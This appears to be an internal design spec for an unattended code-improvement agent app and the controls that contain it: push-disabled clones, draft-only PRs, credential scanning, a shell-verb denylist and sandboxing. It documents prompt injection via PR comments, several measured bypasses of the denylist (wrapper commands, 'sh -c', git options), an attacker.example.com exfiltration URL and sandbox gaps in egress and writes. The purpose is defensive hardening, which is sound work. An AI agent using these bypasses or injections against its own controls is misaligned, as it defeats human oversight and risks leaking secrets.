# Auto-Improvement Module

## Overview

> **Using the app rather than changing it?** The operator's guide is
> [`src/kiro_crew/apps/builtins/auto_improvement/docs/MANUAL.md`](../../../src/kiro_crew/apps/builtins/auto_improvement/docs/MANUAL.md).
> This spec describes internals.

Auto-Improvement is an opt-in (`defaultEnabled: false`) built-in app that runs a
measurement-first self-improvement loop against a GitHub repository. It calibrates
a metric (the "ruler"), **proves** the metric can detect a known win, and only
then runs keep-or-revert improvement cycles. Candidates that survive a
deterministic gate and an A/B (or RED/GREEN) measurement are opened as **draft**
GitHub pull requests for human review.

The load-bearing design property is that every *decision* is deterministic Python
and every *proposal* is an agent: the agent writes candidate fixes, and the gate,
measurer, keeper, and PR pipeline decide what survives. The agent never grades its
own work.

Ported from an external app that targeted a proprietary code-review system; the
port replaced that review service, its CLI, its build tooling, and its cookie auth
with GitHub equivalents, and renamed the change-request vocabulary to pull request
throughout.

## Routes

All routes live under `/api/apps/auto-improvement/` and are registered by
`apps/builtins/auto_improvement/backend/routes.py:register_routes`, mounted
in-process on the gateway's own aiohttp app. Every handler is wrapped in
`_require_enabled` (403 when the app is disabled).

| Method | Path | Purpose |
|--------|------|---------|
| GET | `/health` | liveness; echoes the app name |
| GET | `/config` | current run configuration |
| PUT | `/config` | update configuration (allowlisted keys only) |
| POST | `/setup-clone` | clone or re-point the working repository the run operates on |
| GET | `/branches` | branches available in that clone, for choosing a base |
| GET | `/pr-status?url=&refresh=` | live PR status, CI checks, watcher verdict |
| POST | `/run` | start an improvement run |
| GET | `/run` | the in-flight run's state |
| POST | `/run/stop` | wind down the in-flight run |
| GET | `/ruler` | ruler calibration state |
| GET | `/findings` | ledger entries, newest first |
| GET | `/findings/{fp}` | one ledger entry in full |
| POST | `/findings/{fp}/commit` | commit an accepted change from the ledger |
| POST | `/calibrate` | prove the ruler (Phase 1) before any improvement cycle |
| GET | `/progress` | the cumulative-best staircase for the chart |
| GET | `/events` | server-sent live run events |
| GET | `/deps` | external tool availability (git / gh / ruff) |
| POST | `/deps/install` | install the optional linter |
| POST | `/draft-pr/{fp}` | draft a PR from an already-queued change |
| GET | `/profiles` | every captured profiler frame tree |
| GET | `/profile/{fp}` | one normalized frame tree (flame / sunburst) |
| POST | `/findings/{fp}/forget` | mark purged so dedup lets it retry |
| POST | `/findings/{fp}/purge` | forget and remove artifacts |
| POST | `/findings/purge-dead` | sweep records that can never progress |
| GET | `/watchers` | per-PR watcher sessions |
| POST | `/watchers/{fp}/start` | start/re-attach a PR watcher |
| POST | `/watchers/{fp}/stop` | stop a watcher after its current pass |
| GET | `/watchers/{fp}/log` | what a watcher has done (`?since=` tails) |
| GET | `/sessions` | every linked chat-session record |
| GET | `/sessions/{key}` | one session record |
| PUT | `/sessions/{key}` | link/update a session (drives resume) |
| DELETE | `/sessions/{key}` | forget a session link |

That is the whole surface: `register_routes` mounts exactly these 32 routes and
nothing else. No test asserts the mounted set against this table, so an added
endpoint has to be added here by hand in the same change.

`PUT /config` is an **allowlist**, not a merge. `clone` and `target_url` are
deliberately excluded: they decide which repository the agent is turned loose on,
so they cannot be changed through the generic config endpoint. Rejected keys are
echoed back in `rejected` rather than silently dropped.

## PR status and the watcher verdict

`backend/pr_checks.py` is an interpreter over
`kiro_crew.dashboard.handlers.source_providers`, reusing the core's cached (30 s
TTL), request-coalescing, credential-redacting `gh`/`glab` reader rather than
introducing a second GitHub client.

It reduces a PR to one of three verdicts the watcher loop switches on:

| Verdict | Meaning |
|---|---|
| `READY` | merged, or green checks + no conflicts + no open threads |
| `PROGRESS` | failing required checks, conflicts, open threads, or pending checks |
| `BLOCKED` | closed unmerged, or something code edits cannot fix |

Precedence is deliberate: **failing checks beat a clean mergeable flag**, and the
function is fail-safe toward `PROGRESS` — declaring an unfinished PR ready ends
the watcher early, which is the expensive mistake; an extra cycle is cheap.

Checks that set `allow_failure` (GitLab's advisory opt-out) are counted separately
and never drive the verdict, or one flaky optional job would nudge forever.

## Safety controls

| Control | Where | Behavior |
|---|---|---|
| Push-disabled clone | `backend/clone_setup.py:_disable_push` + `profiles/github_repo/profile.py:RepoIsolation.push_disabled` | **Every** configured fetch/push URL is replaced with exactly one `DISABLED_NO_PUSH` value; setup and runtime fail closed on extra values. The real remote lives in config (`origin_url`), handed only to trusted publishers |
| Draft-only PRs | `profiles/github_repo/pr_recipe.py` | `gh pr create --draft`; never `--web`, merge, ready, or auto-merge |
| Generated head branch | same | `auto-improvement/<kind>-<fingerprint>`; never a human's branch |
| Protected-branch denylist | `spine/push_policy.py` | non-overridable; a hand-edited config cannot widen it |
| Edit allowlist | `spine/gate.py` + profile | ruler/harness/tests/auth are mechanically off-limits |
| Do-not-pollute gate | `spine/pollute.py` | host state hashed before/after; drift blocks the run |
| Second reproduce | `spine/pr_pipeline.py` | an independent A/B must confirm before a PR is drafted |
| Pre-push review gate | `spine/driver.py:_prepush_review_clean` | optional, fail-closed; an unfounded "clean" cannot pass it |
| Tool-request gate | `spine/agent_runner.py:_tool_permitted` + `shell_command_refusal` | the caller's `allowed_tools` is ENFORCED (it used to be accepted and dropped), and state-mutating shell verbs are refused even when Bash is allowed |
| Audit-or-deny approval | `spine/agent_runner.py:_approve` | the unattended auto-approve is logged to the SEL with `critical=True` **before** it is granted; an unwritable audit REJECTS the tool |
| Audited MCP dispatch | `backend/mcp_server.py:_audit` | every `tools/call` is logged, rejected ones included; the pre-dispatch `invoked` event is `critical=True` (audit-or-DENY — an unauditable call is refused), outcome events stay fail-soft since the handler has already run |
| Redacted evidence | `backend/routes.py:_redact_for_display` / `_redact_tree` | EVERY agent-authored field served to the browser is scanned — diff, PR body, and the candidate's signature/hypothesis/evidence/severity/blast-radius, plus the gate tree recursively; **fail-closed** |
| Sandboxed fallback agent (NOT SELECTED) | `spine/agent_runner.py:_spawn_sandboxed_agent` | nothing selects this path any more — both selection sites go offline/refuse instead (see "Why the subprocess fallback is sandboxed rather than deleted"). Retained hardening, for any future caller: it runs through `sandboxed_spawn_argv(mode="strict")` + `popen_limited` (post-exec resource ceiling): worktree visible, credential dirs bind-mounted empty, env scrubbed, `PYTHONPATH` stripped. Hides credentials; does NOT confine writes — see "Known limitation" below |
| Pre-push content scan | `spine/push_policy.py:scan_content_for_secrets` | ONE scanner behind all three exits — draft-PR push, F10 direct push, one-click commit. The full pushed range is scanned; a hit **refuses** the push and the change stays in the local queue; **fail-closed** |
| Audited subprocess agent (NOT SELECTED) | `spine/agent_runner.py:_audit_unattended_agent` | same — retained for a future caller. The `claude -p` path passes `--dangerously-skip-permissions`, so the launch is one blanket approval — logged `critical=True` before the spawn, and an unwritable audit REFUSES to launch |
| Redacted PR prose | same, `_redact_prose` | title and description are redacted (prose survives rewriting; a diff does not) |

### Clone setup and reuse contract

`setup_safe_clone` derives the canonical destination from the validated GitHub
`owner/repo`; it never treats clone contents as trusted. The improvement agent is
expected to edit that checkout, so reuse attests only properties the host can
enforce: the scratch root/destination and Git metadata contain no links or
redirections, local Git config has no includes/URL rewrites/worktree override,
and every origin fetch/push URL is exactly `DISABLED_NO_PUSH`.

A documented setup re-run accepts that sentinel and reasserts the controls, which
is the idempotency guarantee. A live mismatched or multi-valued fetch origin,
unsafe Git metadata/config, linked scratch path, or non-repository destination is
refused without mutation. Push URL values are instead always replaced with
exactly one sentinel before success is reported. Initial clone ignores
global/system Git config, pins hooks and fsmonitor off, allows only the validated
transport, and removes partial output on failure. Branch listing, checkout, and
runtime isolation repeat the metadata and URL-set checks. Git metadata entries must
be regular files (object files may remain hardlinked); FIFOs, sockets, devices,
links, and hardlinked non-object metadata are refused before host Git. Repository integrity
is an unconditional runner startup prerequisite; direct-commit authorization can
relax only push posture, never metadata/config validation. The attributes pin is
published by atomic replacement, so a hardlinked path cannot truncate another
inode. Each trusted publisher validates full repository isolation (metadata/config
safety plus exact disabled URL sets) after the agent's final write and before its
first trusted Git scan/mutation. Perf preflight uses the same capture → attest/retire
→ interpret ordering before progress, archive, or HEAD reads. The one-click route holds
the clone lock and proves the runner idle for that whole critical section; the
driver additionally revalidates after a rebase before its retry push. Local
configuration that can invoke host-side helpers (including diff, filter, merge,
editor, askpass, hook, fsmonitor, proxy, signing, attributes-file, and
excludes-file helpers) is refused; trusted Git pins both external paths to Git's
cross-platform `/dev/null` spelling, and content scans additionally clear `diff.external` and disable external diffs. If safety
changes after an agent/build step, the run stops before further Git, atomically
moves the canonical clone into a private `.unsafe-*` incident directory, reports
the retained path, and caps those incident copies at three per repository;
ordinary setup mismatch never creates these copies.

This contract deliberately makes no HMAC or clean-checkout claim: clone content
and history remain agent-writable, while trusted publishing is contained by
protected-branch policy, content scanning, final repository-config validation,
and explicit config-held push destinations.

### Why the unattended runner consults the platform governance gate

`SessionAgentRunner` auto-approves the provider's permission requests at its OWN gate (an
app-local allowlist + the shell denylist). That gate alone was NOT enough: it never routed
the pending call through the platform's `hooks.on_tool_call` chokepoint, so the enterprise
governance PROFILE ceiling, the builtin denied-command rules, and the `~/.aws`/`~/.ssh`
sensitive-path blocks were all silently inert on this path. The agent is UNATTENDED and its
prompt embeds outsider-writable PR-comment text, so an injected instruction could drive an
auto-approved call the central gate would deny (e.g. a credential-path read). Every request
now passes through the same `HookManager` the dashboard and Slack paths use, BEFORE the
app-local checks, and a platform `deny` refuses the call; the app-local allowlist/denylist
remains as an additional restriction on top. FAIL-CLOSED on a broken hook layer: an earlier
revision failed open, reasoning it was a second gate stacked on the app-local one, but the
platform gate is the only thing that carries the enterprise ceiling, `BUILTIN_DENIED_RULES`
and the `~/.aws`/`~/.ssh` path blocks — so failing open silently dropped exactly the checks
the app-local list does not make. Raised by the Arbiter's long-term review of this branch.

### Why the subprocess fallback is sandboxed rather than deleted

Review asked for `AgentRunner` (the `claude -p` fallback) to be removed outright, on the
grounds that its unattended Bash tool escapes the provider sandbox. The concern was right;
the remedy would have turned "no in-process provider configured" from *degraded but
functional* into *silently does nothing*. Routing the spawn through the same chokepoint the
gate's test execution uses answers it directly — a malicious repository prompt can no
longer reach credentials outside the worktree — while keeping the path that works.

Review asked repeatedly for the fallback to be deleted outright, each time citing the
unattended Bash tool — and one instance of that concern was CORRECT and is now fixed: an
exported `GITHUB_TOKEN` did reach the agent even after the spawn was sandboxed, because
`kiro_crew.sandbox.scrub_env` covers `AWS_SECRET`/`SLACK_*`/`TELEGRAM_*` but not `GITHUB_*`.
Measured on the author's host: the child printed the real token. The spawn now strips
credential-*shaped* names (`*TOKEN*`, `*SECRET*`, `*PASSWORD*`, `*API_KEY*`, `*CREDENTIAL*`)
after the sandbox builds the env, matching what the gate already did — the two places
untrusted content executes. Re-measured: absent, with `PATH` intact.

One later framing of this request asked for the spawn to be routed through `AcpClient._spawn()`
/ the provider helpers instead. An earlier revision of this section called that "not
implementable", on the grounds that `SessionAgentRunner.available()` is
`cfg.create_provider_factory() is not None` and `_build_runner` only reaches `AgentRunner` when
that returned `None` — so the provider path would require the very provider whose absence
selected the branch.

**That was only true of one of the two branches, and the review was right.** `_build_runner`
also fell through to `AgentRunner` when a provider WAS available but
`ensure_agent_registered()` failed — measured: `available()` True + `ensure_agent_registered()`
False returned `AgentRunner`. In that state a provider exists and its permission gate was
being bypassed anyway, which is exactly what the objection described. A registration failure
now returns `None` (offline) instead. The fallback is reached only when there is genuinely no
provider to route through, which is the narrow case its rationale always claimed.

There are **two** such selection sites, and fixing one is not enough: `pr_watchers._make_runner`
had the identical fall-through, and the review finding moved straight from `runner.py` to
`pr_watchers.py` the moment the first was closed. That site RAISES rather than returning `None`
(its contract — see the "no agent runner available" exit), and `_run_watcher` turns the raise
into `STATUS_ERROR` on that watcher, so it is a failed pass rather than a dead gateway. Both
sites' four selection paths are pinned by tests.

The other half the request pointed at — that only the blanket launch was audited — is fixed
separately; see "Why the subprocess fallback audits every tool it uses".

**RESOLVED: the fallback selection is REMOVED, and the review was right.** The argument for
keeping it was that it is "the ONLY path that authors fixes when no in-process provider is
configured" — so deleting it would turn a working configuration into one that appears to run
and produces nothing. That premise does not hold. `SessionAgentRunner.available()` is
`cfg.create_provider_factory() is not None`, and `create_provider_factory` has exactly two
returns (`AcpProvider(...)` and `_acp`) and **never returns None** — verified by inspecting its
source. So `available()` is False only when the config load or the factory RAISES: a broken
install, not an unconfigured one. The state the fallback existed to serve cannot occur.

And in the state that CAN reach it, shelling out is the wrong answer: running an unattended
agent with `--dangerously-skip-permissions`, outside the provider's permission gate, precisely
when the platform is unhealthy. Both selection sites (`runner._build_runner` and
`pr_watchers._make_runner`) now go OFFLINE / refuse instead. The `AgentRunner` CLASS is kept —
it is still the sandboxed, per-tool-audited implementation a future caller could route properly
— but nothing selects it.

Worth recording how this was reached, since it took many rounds: the objection was declined
repeatedly on reasoning that turned out to cover only part of the code path (two fall-through
holes were real and are fixed above), and the final premise was falsified only by reading
`create_provider_factory` instead of trusting the docstring. The sandbox hardening described
below still applies to the class and remains the right defence for any future caller.

**STRICT mode, not the default.** `standard` deliberately leaves `~/.aws` readable so a
test suite can use the AWS CLI — appropriate for the gate's `_run`, wrong for a
fix-authoring agent that needs no credentials and runs with
`--dangerously-skip-permissions`. Measured on the author's host: under `standard` the child
saw all 7 `~/.aws` entries; under `strict`, 0. `TestFallbackAgentCannotSeeCredentials` pins
the mode rather than re-measuring the filesystem, so it stays meaningful on a host where
user namespaces are unavailable.

The spawn lives in its own uniquely-named method for a mechanical reason worth recording:
`test_spawn_audit` keys findings by `file::function`, and this module has TWO `run`
methods (`AgentRunner` and `SessionAgentRunner`). Inline, the sandboxed spawn was
attributed to the wrong one and reported as unrouted — the audit that guarantees every
agent-influenced spawn is sandboxed was being defeated by a name collision.

### Detect-and-refuse vs redact

There are **three** ways content leaves this app — the draft-PR push, the F10 direct
push, and the operator's one-click commit — and they share one scanner in
`spine/push_policy.py`. That is deliberate: a credential gate guarding only some of the
exits is not a gate, and the first pass at this shipped exactly that bug (the PR path was
scanned, the other two were not). `TestEveryPushPathScansContent` asserts structurally
that each path delegates rather than keeping its own copy.

The push scan **detects and refuses**; it never rewrites. Redacting a code diff would
corrupt the very fix the gate just proved, so a credential hit sends the change to the
durable queue (`pr_queue/<fp>.diff`) for a human to look at rather than publishing a
silently-altered patch. PR *prose* is the opposite case — a rewritten sentence is still a
valid sentence — so the title and body are redacted in place.

Every PR-queue text artifact (the verified ``.diff`` and its ``.pr.md`` description) is
written as UTF-8 by the GitHub recipe, the direct-commit fallback, and the dry-run recipe.
Candidate content is arbitrary Unicode, so the durable queue must not depend on the host's
legacy Windows code page.

Note the two distinct failure modes for prose, which the first version conflated. "Scanned,
and it had a hit" is redacted and ships. "Could not scan at all" is **not** the same thing,
and it now raises `ProseRedactionUnavailable` so `draft()` degrades to the queue instead of
calling `gh pr create`. That path used to return the text unscanned, reasoning that the diff
beside it had already passed a fail-closed scan and the PR is only a draft. The reasoning
does not survive scrutiny: the prose is a separate artifact from the diff, it is the part
the agent wrote most freely, and a published PR description cannot be un-published — it
persists in the API's edit history even after an edit. Every other egress path in this app
already fails closed (`mcp_server._redact_result`, `routes._redact_for_display`); this was
the one that did not. The queue copy is still written from the raw text, because it never
leaves the host and a human needs to see what the agent actually wrote.

The direct-push scan diffs `HEAD~1..HEAD` — the verified commit — NOT `<branch>..HEAD`: the
commit sits on the tip of that local branch, so a branch-vs-HEAD diff is EMPTY and the
fail-closed scan would pass on 0 bytes, a blind gate. This regressed when the branch checkout
moved to the local name (see the multi-cycle-detach fix) and was caught by review; measured
against a real repo, a commit adding an AWS key gave a 0-byte `<branch>..HEAD` diff and a
144-byte `HEAD~1..HEAD` diff.

### Why the watcher keeps its shell

`allowed_tools` was accepted by `SessionAgentRunner.run` and never forwarded to the event
loop, so the approval granted whatever a request asked for. That is worst for a **watcher**:
its prompt is built from PR-comment text an outsider can write, and it runs against an
authenticated `gh`. The prompt fences that text as untrusted DATA, but a fence the model
must choose to obey is not a control.

Review proposed removing Bash for watchers. That would break the feature — the watcher's
task is literally "run the repo's build, test and lint commands, find the root cause, and
fix it". So the shell stays and the **verbs** are denied: `git push`,
`gh pr merge`/`ready`/`close`, `gh api`, `gh auth`, `gh secret`, `gh workflow run`,
`curl`/`wget`, `ssh`/`scp`. The repo's own `is_sensitive_bash_command` was checked first and
does not cover this — it allows `gh pr merge`.

**What that leaves un-confined, stated plainly.** The denylist gates the command a request
ASKS for, not what that command then does, so it is a first barrier and not a boundary.
Re-measured after review raised this a second time:

* **Credentials ARE confined.** Under `sandboxed_spawn_argv(mode="strict")` a NESTED process
  sees `~/.aws`, `~/.config/gh` and `~/.docker` as empty on a host where they are populated,
  and `~/.ssh` exposes only `known_hosts` (host-key verification needs it) while `id_rsa` and
  `*.key` stay hidden. A nested `gh auth status` reports "not logged into any GitHub hosts".
* **Network egress is NOT confined.** The sandbox never enters a network namespace —
  `CLONE_NEWNET` appears nowhere in `sandbox.py`, and its own docstring explains that agentic
  commands need reachable networking. `curl`/`wget`/`nc` are denied, but `python helper.py` is
  allowed and can open a socket.

**Watchers are therefore OPT-IN.** An earlier revision of this section called the residual
risk operator-accepted — which was wrong, because nothing required an operator action:
`GET /watchers` ran `reconcile_failing_prs(force=True)`, so merely READING the watcher list
started a shell-capable agent for every filed pull request whose checks had gone red. There
was no consent moment to point at. Promotion now requires `watcherAutoStart` (default OFF,
same shape as `autoPublish`), so a GET is read-only and the self-healing loop is something an
operator switches on deliberately. Orphan-clone reclamation still runs either way — it only
deletes scratch directories and starts nothing.

So the operating rule is: **turn `watcherAutoStart` on only for repositories whose
pull-request comments you would be willing to execute.** Closing this properly needs a network-isolating
sandbox primitive at the platform layer, which is a change to shared infrastructure and not
something this app should grow privately. Recorded at the `security_posture` disclosure sink
so it appears in the posture snapshot rather than only here, and pinned by
`TestWatcherSandboxConfinesCredentialsButNotEgress` — which asserts the half that IS enforced,
so a regression in the credential confinement fails loudly instead of silently widening the
gap.

Two asymmetries worth keeping straight:

* `allowed_tools=None` means "no restriction imposed" (pre-existing callers); `[]` means
  "no tools at all" — `agent_discovery` uses the empty list to force an answer from context.
  Conflating them would invert that call site into granting everything.
* The denylist is matched loosely (substring, normalized). For a denylist, erring toward
  refusal is the safe direction — but the read-only diagnostics the prompts actually name
  (`gh pr checks`, `gh pr view --comments`, `gh run view --log-failed`) are pinned by test,
  because a new entry that caught one would break the watcher while looking like a
  hardening.

### Why the approval audit is `critical` but the MCP audit is not

Both are audit points on the same app, deliberately with opposite failure modes.
The loop's auto-approve is unconditional and unattended, so the SEL entry is the
only record that a tool ran at all — losing it loses the event, and the tool is
therefore refused when the log cannot be written. The MCP tools only ever *read*
on-disk run artifacts, so refusing to answer `get_status` because the audit file is
unwritable would trade a real capability for no security gain; that path notes the
failure on stderr (never stdout — that is the JSON-RPC channel) and answers.

### Why BOTH urls, not just the push url

`git push --push` is honored only when the caller pushes **by remote name**.
`git push "$(git remote get-url origin)" HEAD` ignores the push url entirely and writes to
the fetch url — and the loop's agent runs auto-approved Bash *inside this clone*, so a
repository instruction could do exactly that. Measured against a local bare repo before
fixing: pushing by name was refused, pushing to the fetch url landed a new branch
upstream. Disabling one url made `push_disabled` report true for a clone that could still
write to the remote.

Both urls are therefore neutralized, and `_ok` verifies both before reporting success. The
real remote is carried in config as `origin_url` — deliberately NOT in `_CONFIG_WRITABLE`,
since like `clone`/`target_url` it decides where a push can land — and handed explicitly to
the three trusted publishers (PR-draft recipe, F10 direct push, one-click commit). Each
still falls back to reading the clone's remote, which now yields the sentinel and is
refused: an older config degrades to "queued locally", never to an unguarded push.

### Why the stored push destination is host-validated

``resolve_origin_url`` is the single place the push destination is resolved for all three
exits — the draft-PR push, the F10 direct push and one-click commit — so whatever it returns
is where a verified change goes. It returned ``origin_url`` **verbatim** and re-validated only
the legacy ``target_url`` fallback, which made its own docstring's promise ("a hand-edited
``target_url`` cannot smuggle in an arbitrary push destination") false for the preferred path.
Measured: ``{"origin_url": "https://attacker.example.com/exfil.git"}`` came back unchanged,
while the identical string under ``target_url`` was correctly refused.

The obvious fix — re-run ``validate_target_url`` on both keys — does not work, and measuring
caught it: that helper accepts only ``https://`` INPUT, but ``setup_safe_clone`` persists
``spec.clone_url``, which is the SSH form ``git@github.com:owner/repo.git`` whenever ``gh``
prefers ssh. Re-validating would have refused every ssh-configured install's own remote and
degraded it to queue-only (it broke 3 existing tests immediately).

So the NETWORK HOST is checked instead, which is the property that matters. Exact host match,
never ``endswith`` — ``evilgithub.com`` and ``github.com.attacker.net`` both fail. ``http://``
and ``git://`` are refused because cleartext is never this app's push transport, and the
``DISABLED_NO_PUSH`` sentinel is refused because it is a marker rather than a destination.
LOCAL paths (``/tmp/x.git``, ``file://``) stay allowed: there is no network host to redirect
to, it is what the app's own tests push to, and an operator pointing at a local bare repo is a
legitimate offline setup. The security guidance on untrusted URL destinations asks for exactly
this — allowlist the destination rather than trusting persisted input.

### Why tool approval is one-shot and a queued change is not "filed"

Two ways a single success used to grant a permanent exemption.

``_approve`` ran the per-tool allowlist check and a ``critical=True`` audit-or-deny write, then
called ``approve_tool(rid, always=True)``. Per the provider contract that means "the user picked
'always allow'" — ACP backends may turn it into an ``addRules`` suggestion — so the provider
stops sending permission requests and every LATER matching call skipped BOTH of those gates.
The unattended loop is precisely the caller that must not buy a blanket exemption with its first
approval, so the approval is now one-shot.

Separately, ``pr_recipe.draft`` returns ``QUEUED:<fp>`` when the change is on disk but no pull
request could be opened (no ``gh``, no network, a refused push), and the pipeline recorded that
as ``filed``. ``filed`` is HARD-terminal in ``Ledger.known`` — "a filed CR is never re-filed" —
so the locus was deduped forever and never retried, and ``filed_crs()`` handed the PR watchers a
non-URL. Measured: ``known()`` returned True and ``filed_crs()`` returned ``['QUEUED:abc']``. It
is now recorded as SOFT-terminal ``STATUS_ERROR``, which becomes retryable once the cooldown
elapses — the accurate description of "could not file it this time".

The subtle half is that ``CrOutcome.filed`` stays **True**. In the driver ``filed`` means "this
was a realized win", and a False there also rolls the provisional commit back and decrements
``kept`` — throwing away a change that passed RED×2 → GREEN → STAYGREEN merely because ``gh``
was absent (measured: a bounded run's ``kept`` went 1 → 0). The win is real and the durable
queue copy holds it; only the publication failed, which is what the retryable ledger status
records. Both raised by the GPT review of this branch.

### Known limitation: a second perf PR carries the first perf fix

The perf loop is EVOLUTIONARY: "current best == HEAD" is its durable state, `base_sha` is
re-read from HEAD every cycle, and every measurement is reported as "Δ vs current best". So a
kept perf winner deliberately stays on the local branch — that is what the next cycle measures
against.

The consequence, raised by review: the draft PR pushes the clone's whole `HEAD`, and the PR is
opened against the REMOTE base, so a SECOND cycle's PR contains the first cycle's fix as well.
Measured: pushing whole HEAD for PR#2 included cycle 1's change.

Review's suggested fix — reset after the filed-PR event, mirroring the bug track — is declined
because it inverts the premise: each cycle would re-measure against the ORIGINAL base, so a
second improvement to the same hot path could never register as an improvement. The bug track
has no such property (independent loci, one PR each), which is why the same reset was correct
there and is not the same change here.

Rebuilding a per-winner branch from the remote base would satisfy both goals in principle.
Measured, it is not a safe drop-in: two cycles improving the SAME line produce a patch that
does not apply to the untouched base, and the naive rebuild silently produced a branch
containing NEITHER fix. Doing it properly needs a cherry-pick with conflict handling plus a
decision about what to publish when the replay fails — a design change, not a bug fix.

Latent rather than live today: the perf track has never kept a measured win on a real
repository (see the target-suitability limit above), so no perf PR has been filed for a second
cycle to contaminate. A maintainer enabling perf on a suitable target should close this first.

### Known limitation: the sandbox hides credentials, it does not confine WRITES

Stated plainly because it bounds every "sandboxed" claim above. `sandboxed_spawn_argv(mode=
"strict")` bind-mounts credential directories empty and scrubs the environment, so
agent-authored code cannot READ the operator's secrets — that part is measured (under
"standard" the child saw all 7 `~/.aws` entries; under "strict", 0). It does **not** make the
rest of the filesystem read-only. Measured on the author's host: a strict-mode child running
`open('~/.probe','w')` succeeded, exit 0, file clobbered.

So a candidate's own `conftest.py` or reproducing test — code the model wrote, executed by the
gate — can modify same-user files outside the worktree.

**What IS now closed: Kiro Crew's own control files.** The most consequential case was measured
and fixed rather than merely documented — a strict-mode child appended to
`~/.kiro/crew/.data-home-ready` and exited 0, corrupting the installation's own state. Those
paths are `security.write_protected_home_paths()`, and that protection is enforced by the
platform HOOK layer, which a sandboxed subprocess never passes through — so it was inert for
exactly the code that most needs it. `_run` now passes the PARENT directory of each
write-protected path as `extra_hidden_dirs`, bind-mounting an empty dir over it, and the write
fails at the kernel. Re-measured through the real `_run`: blocked, with the interpreter and all
71 real-subprocess gate tests unaffected.

Two measured details, because the obvious version of this fix does nothing. The mask must name
a DIRECTORY: `extra_hidden_dirs` reaches the launcher's `SENSITIVE_DIRS` loop, which is guarded
by `os.path.isdir(target)`, so a file path is silently skipped (files go through a separate
`SENSITIVE_FILES` list the public helper does not expose). And the mask cannot be widened to
`$HOME`: the interpreter's own stdlib can live there — hiding `~/.local/share` broke
`import platform` outright.

**What remains open**: arbitrary same-user files elsewhere (`~/notes.txt`) are still writable.
Closing that needs a general write-confinement primitive in `kiro_crew.sandbox`, which has none
today — no read-only bind, no tmpfs overlay — and adding one changes the shared sandbox for
every caller, so it belongs in its own PR. Review's alternative, failing closed at `profile._run`
until then, would disable the entire bug track (no test could run at all). Raised by the GPT
review of this branch.

### Why the credential scan resolves its base (and a refused push rolls back)

Two ways the pre-push credential scan could look clean while publishing a secret. Both are the
same shape: the scan RANGE and the pushed RANGE disagreed.

`pr_recipe._scan_pushable_content` diffed `base_ref...HEAD`, and `base_ref` is
`config["branch"]` — a plain LOCAL name if the operator set one. With `base_ref="work"` and
HEAD on `work`, that diff is EMPTY, so `scan_content_for_secrets("")` reports clean. Measured on
a real bare repo: 0 bytes with the local name, the planted `AKIAIOSFODNN7EXAMPLE` invisible; 132
bytes with `origin/work`, caught. `_scannable_base` now resolves to a ref distinct from HEAD
(trying the remote-tracking form) and REFUSES when it cannot — refusing beats degrading to the
narrower single-commit scan, because a narrower range that happens to pass is exactly the silent
downgrade this guards. This is the same self-diff already fixed in `driver._direct_push`; the
recipe carried its own copy, which is why fixing one did not fix the other.

Separately, a REFUSED direct push left its commit at HEAD. The direct-push scan range is
`HEAD~1..HEAD` — one commit — so the next winner's scan does not see the refused commit while
its push publishes both. Measured: candidate A refused for a planted credential, then candidate
B's scan range showed the credential `False` while its pushed range showed `True`. Both tracks
now `_reset_provisional(pre_sha)` on a failed push. The bug track had no `else` branch at all
and fell straight through to `return` with the commit intact.

### Why the shell denylist unwraps before it matches

Three rounds on this branch taught the same lesson, and it is worth stating once as a rule:
**a check that inspects ONE position is evaded by adding a position.**

* First round: a substring match, evaded by an option — `gh --repo o/r pr ready`. Fixed by
  tokenizing and skipping global options.
* Second round: per-command matching, evaded by a separator — `echo hi && git push`. Fixed
  by splitting on `&&`/`||`/`;`/`|`/`$(`/backtick.
* Third round: matching on `words[0]`, evaded by anything that RUNS another command.
  Measured — all of these were ALLOWED while the bare `git push` was refused:
  `sudo git push`, `env git push`, `timeout 5 git push`, `nohup git push`,
  `xargs git push`, `nice -n 5 git push`, `setsid git push`, `stdbuf -oL git push`,
  and every `sh -c "…"` form.

Wrappers are now stripped and the command behind them checked instead, recursively (so
`sudo env timeout 3 git push` and `sh -c "sudo git push"` both resolve), and a shell's `-c`
argument is re-analyzed from the top so separators and further wrappers inside the string
are seen too. Two details that were bugs in the first attempt at this fix: an option's
VALUE has to go with it (`nice -n 5 git push` left `5` looking like the command), and the
recursion budget must REFUSE on exhaustion — for a denylist, "gave up" must not mean
"allowed".

Reaching the subcommand also means skipping GLOBAL OPTIONS correctly, and the first attempt got
this backwards. It assumed any option without `=` takes a value — the comment even claimed that
"cannot under-skip" — but a VALUELESS option then swallows the verb: measured, bare `git push`
was REFUSED while `git --no-pager push`, `--paginate`, `--bare`, `--literal-pathspecs` and
`--no-replace-objects` were all **ALLOWED**, because `push` was consumed as the option's value
and the denylist matched `['origin', 'main']`.

Value-taking global options are now enumerated per binary (`_VALUE_TAKING_OPTIONS`) and anything
unlisted is treated as valueless. That direction is the safe one for a denylist: an unlisted
value-taking option means its value is read as a subcommand, which can only over-refuse a benign
command, never under-refuse a forbidden one. `--exec-path` is deliberately NOT in the table
because its value is *optional* (`--exec-path[=<path>]`), and listing it reintroduced the same
swallow for `git --exec-path push` — found by writing a 25-case matrix rather than by the next
review round.

The table also has to cover SHELL BUILTIN wrappers, not just binaries on PATH. `command`,
`exec` and `builtin` never appear as executables, but a nested `sh -c "…"` argument is
re-analyzed by this same table, so leaving them out was a live hole. Measured before adding
them: bare `git push` was REFUSED while `command git push` and `exec git push` were both
ALLOWED, as was `sh -c "command git push origin main"`. `command` was raised by the GPT
review of this branch; `exec` and `builtin` are the same class and were found by testing the
neighbours rather than waiting for the next review round.

`_COMMAND_WRAPPERS` is deliberately not a "forbid these binaries" list. `env`, `timeout`
and `nice` are legitimate and the gate's own test runs use them, so `timeout 5 pytest -q`
stays allowed; a denylist that breaks the build while looking like a security improvement
is the failure mode to avoid. The same holds for the builtins — the wrapper is stripped only
so the real verb behind it can be judged, so `command -v git` (asking where git is, not
pushing) and `exec pytest -q` stay allowed. A dedicated test pins that non-over-refusal.

### Why the protected-branch denylist normalizes before it matches

A denylist has to see a branch the way **git** does, not the way it was typed.
`is_protected_branch` originally matched a normalized short name, so `refs/heads/main` —
the same ref, which `git push <url> HEAD:refs/heads/main` accepts verbatim — did not match
and `authorize_direct_push` returned yes. `branch` is in `_CONFIG_WRITABLE`, so a
`PUT /config` sets it with no shape check on write and both one-click commit and the
driver's F10 path feed it straight through, which makes this reachable rather than
theoretical.

`normalize_branch` therefore strips `refs/heads/`, `refs/remotes/`, `origin/` and
`upstream/` **repeatedly until the value stops changing**, not in one ordered pass: the
first version of the fix did one pass and `origin/refs/heads/main` still got through
(measured). The loop is bounded at six iterations rather than `while True` so a crafted
